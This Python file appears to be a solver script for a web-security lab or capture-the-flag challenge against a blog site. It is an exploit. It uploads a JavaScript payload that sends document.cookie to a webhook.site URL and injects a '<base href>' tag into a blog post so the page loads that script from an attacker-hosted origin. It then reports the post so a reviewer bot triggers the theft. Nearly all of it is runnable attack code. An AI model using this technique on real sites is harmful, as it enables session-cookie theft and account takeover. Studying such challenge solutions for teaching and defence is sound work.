import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite, HostedWebsiteCSE

import html

BASE_URL = "https://engineering.quoccacorp.com"
HTML_FILENAME = f"{Path(__file__).stem}.html"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()
        self.hosted_website = HostedWebsiteCSE()
        self.hosted_website.connect()

    # Paste into https://csp-evaluator.withgoogle.com
    def get_csp(self, url: str = BASE_URL) -> str:
        response = self.session.get(url)
        return response.headers["Content-Security-Policy"]

    # /analytics.js
    def scrape_root_relative_js_script_path(self) -> str:
        from bs4 import BeautifulSoup
        response = self.session.get(BASE_URL)
        soup = BeautifulSoup(response.text, "html.parser")
        target_script_element = soup.find_all("script", src=True)[-1]
        return target_script_element["src"]

    def main(self):
        js_script_path = self.scrape_root_relative_js_script_path()
        js_filename = js_script_path.lstrip('/')

        JS_PAYLOAD = f'fetch(`{self.webhooksite.url}?q=${{document.cookie}}`);'
        self.hosted_website.upload_file(js_filename, JS_PAYLOAD.encode(), write_to_root=True)

        HTML_PAYLOAD = f'<script src="{js_script_path}"></script>'
        html_url = self.hosted_website.upload_file(HTML_FILENAME, f"<h1><pre>{html.escape(HTML_PAYLOAD)}</pre></h1>\n{HTML_PAYLOAD}".encode(), write_to_root=True) # Only HTML_PAYLOAD is needed. <pre> is used for debugging

        BLOG_POST_CONTENT_PAYLOAD = f'<base href="{html_url}">'
        response = self.session.post(f"{BASE_URL}/posts", data={
            "title": f"{HTML_PAYLOAD = }\n{JS_PAYLOAD = }\n{BLOG_POST_CONTENT_PAYLOAD = }",      # "title" can be anything
            "content": f"{html.escape(BLOG_POST_CONTENT_PAYLOAD)}\n{BLOG_POST_CONTENT_PAYLOAD}"} # "content" must contain the payload
        )

        # Report Blog Post
        response = self.session.post(f"{response.url}/report")

        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
